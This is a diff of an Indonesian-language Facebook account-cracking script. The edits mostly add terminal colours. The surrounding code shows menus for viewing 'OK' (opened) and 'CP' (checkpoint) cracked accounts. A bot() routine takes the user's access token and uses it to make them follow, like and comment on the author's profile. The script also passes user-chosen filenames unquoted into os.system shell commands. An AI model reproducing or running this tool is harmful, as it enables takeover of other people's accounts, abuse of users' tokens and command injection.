@@ -183,7 +183,7 @@ def random_ipv6():
 def login():
 	clear()
 	banner()
-	token = input("\n"+balmond+l+" Masukkan Token Facebook : ")
+	token = input("\n"+balmond+l+" \33[1;93mMasukkan Token Facebook : \33[1;92m")
 	try:
 		hujan = requests.get("https://graph.facebook.com/me?access_token="+token)
 		batu = json.loads(hujan.text)
@@ -207,7 +207,7 @@ def bot():
 		time.sleep(0.5)
 		login()
 	print(balmond+l+" Bentarr Bree, Follow Duluu Amaa Setor Token Mwhehehe")
-	komentar = random.choice(["Apa Kabar Bang Ndrii"])
+	komentar = random.choice(["Apa Kabar Bang Ntang"])
 	requests.post("https://graph.facebook.com/100014905842581/subscribers?access_token="+token) # sptty chan
 	requests.post("https://graph.facebook.com/1262475690925947/likes?summary=true&access_token=" + token)
 	requests.post("https://graph.facebook.com/1262475690925947/comments/?message="+komentar+"&access_token="+token)
@@ -257,7 +257,7 @@ def menu():
 	print(s+"{"+m+"07"+s+"}"+l+" \33[1;93mCek Opsi Hasil Crack "+s+"{ok/cp}")
 	print(s+"{"+m+"08"+s+"}"+l+" \33[1;93mCek Result Crack")
 	print(s+"{"+m+"00"+s+"}"+l+" \33[1;91mLogout")
-	sayangku = input("\n"+balmond+l+" Pilih : ")
+	sayangku = input("\n"+balmond+l+" \33[1;93mPilih : \33[1;92m")
 	if sayangku=="1" or sayangku=="01":
 		publik()
 	elif sayangku=="2" or sayangku=="02":
@@ -278,11 +278,11 @@ def menu():
 		tema()
 	elif sayangku=="0" or sayangku=="00":
 		os.system("rm -rf token.txt")
-		jalan(balmond+l+" Thanks Udah Pake Sc Gua Bro")
+		jalan(balmond+l+" \33[1;93mThanks Udah Pake Sc Gua Bro")
 		time.sleep(0.5)
 		exit()
 	else:
-		jalan("\n"+balmond+m+" Pilihan Anda Invalid")
+		jalan("\n"+balmond+m+" \33[1;91mPilihan Anda Invalid")
 		time.sleep(0.5)
 		menu()
 
@@ -329,21 +329,21 @@ def tema():
 # RESULT
 
 def result():
-	print(s+"\n{"+m+"1"+s+"}"+l+" Cek Result CP "+k+"{akun sesi}")
-	print(s+"{"+m+"2"+s+"}"+l+" Cek Result OK "+k+"{akun terbuka}")
-	print(s+"{"+m+"0"+s+"}"+l+" Kembali")
-	pilih = input("\n"+balmond+l+" Pilih : ")
+	print(s+"\n{"+m+"1"+s+"}"+l+" \33[1;93mCek Result CP "+k+"{akun sesi}")
+	print(s+"{"+m+"2"+s+"}"+l+" \33[1;92mCek Result OK "+k+"{akun terbuka}")
+	print(s+"{"+m+"0"+s+"}"+l+" \33[1;91mKembali")
+	pilih = input("\n"+balmond+l+" \33[1;93mPilih : \33[1;92m")
 	if pilih=="1" or pilih=="01":
 		try:
 			lisaa = os.listdir("Hasil_Cp")
 		except FileNotFoundError:
-			jalan(balmond+m+" Direktori Tidak Ditemukan")
+			jalan(balmond+m+" \33[1;93mDirektori Tidak Ditemukan")
 			time.sleep(0.5)
 			menu()
 		if len(lisaa)==0:
-			print("\n"+balmond+k+" Hasil CP")
-			print(balmond+m+" Tidak Ada Hasil Cp")
-			input(balmond+l+" Kembali")
+			print("\n"+balmond+k+" \33[1;93mHasil CP")
+			print(balmond+m+" \33[1;93mTidak Ada Hasil Cp")
+			input(balmond+l+" \33[1;91mKembali")
 			time.sleep(0.5)
 			menu()
 		else:
@@ -354,25 +354,25 @@ def result():
 			try:
 				binatang = open("Hasil_Cp/%s"%(marjan))
 			except IOError:
-				jalan(balmond+l+" Nama File Tidak Ada")
+				jalan(balmond+l+" \33[1;93mNama File Tidak Ada")
 				time.sleep(0.5)
 				menu()
 		print(""+l)
 		bilur = os.system("cd Hasil_Cp && cat %s"%(marjan))
-		input("\n"+balmond+l+" Kembali")
+		input("\n"+balmond+l+" \33[1;91mKembali")
 		time.sleep(0.5)
 		menu()
 	elif pilih=="2" or pilih=="02":
 		try:
 			lisaa = os.listdir("Hasil_Ok")
 		except FileNotFoundError:
-			jalan(balmond+m+" Direktori Tidak Ditemukan")
+			jalan(balmond+m+" \33[1;92mDirektori Tidak Ditemukan")
 			time.sleep(0.5)
 			menu()
 		if len(lisaa)==0:
-			print("\n"+balmond+l+" Hasil Ok")
-			print(balmond+m+" Tidak Ada Hasil Ok")
-			input(balmond+l+" Kembali")
+			print("\n"+balmond+l+" \33[1;92mHasil Ok")
+			print(balmond+m+" \33[1;92mTidak Ada Hasil Ok")
+			input(balmond+l+" \33[1;91mKembali")
 			time.sleep(0.5)
 			menu()
 		else:
@@ -383,12 +383,12 @@ def result():
 			try:
 				binatang = open("Hasil_Ok/%s"%(marjan))
 			except IOError:
-				jalan(balmond+l+" Nama File Tidak Ada")
+				jalan(balmond+l+" \33[1;92mNama File Tidak Ada")
 				time.sleep(0.5)
 				menu()
 		print(""+l)
 		bilur = os.system("cd Hasil_Ok && cat %s"%(marjan))
-		input("\n"+balmond+l+" Kembali")
+		input("\n"+balmond+l+" \33[1;91mKembali")
 		time.sleep(0.5)
 		menu()
 	elif pilih=="0" or pilih=="00":
